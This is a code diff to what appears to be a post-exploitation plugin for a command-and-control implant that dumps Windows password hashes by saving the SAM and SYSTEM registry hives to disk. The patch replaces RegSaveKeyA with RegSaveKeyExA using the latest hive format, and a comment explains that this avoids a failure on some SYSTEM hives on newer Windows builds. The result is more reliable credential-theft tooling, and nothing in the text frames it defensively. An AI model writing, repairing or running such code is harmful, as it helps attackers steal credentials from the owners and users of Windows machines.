@@ -4,6 +4,10 @@
 #include "hive_parser.c"
 #include "beacon.h"
 
+#ifndef REG_LATEST_FORMAT
+#define REG_LATEST_FORMAT 2
+#endif
+
 const BYTE ODD_PARITY[] = {
     1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
     16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
@@ -281,18 +285,20 @@ void go()
         return;
     }
 
-    // Save the hives to a files
-    res = ADVAPI32$RegSaveKeyA(hSystem, systemBackupPath, NULL);
+    // Save the hives to files. REG_LATEST_FORMAT, not RegSaveKey's legacy
+    // format: the legacy writer fails with 1450 (ERROR_NO_SYSTEM_RESOURCES)
+    // on some SYSTEM hives, latest format works on 20348 and 26100 alike.
+    res = ADVAPI32$RegSaveKeyExA(hSystem, systemBackupPath, NULL, REG_LATEST_FORMAT);
     ADVAPI32$RegCloseKey(hSystem);
     if (res != ERROR_SUCCESS && res != ERROR_ALREADY_EXISTS) {
-        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegSaveKeyW failed: %d\n", res);
+        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegSaveKeyEx(SYSTEM) failed: %d\n", res);
         return;
     }
 
-    res = ADVAPI32$RegSaveKeyA(hSam, samBackupPath, NULL);
+    res = ADVAPI32$RegSaveKeyExA(hSam, samBackupPath, NULL, REG_LATEST_FORMAT);
     ADVAPI32$RegCloseKey(hSam);
     if (res != ERROR_SUCCESS && res != ERROR_ALREADY_EXISTS) {
-        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegSaveKeyW failed: %d\n", res);
+        BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegSaveKeyEx(SAM) failed: %d\n", res);
         return;
     }
 
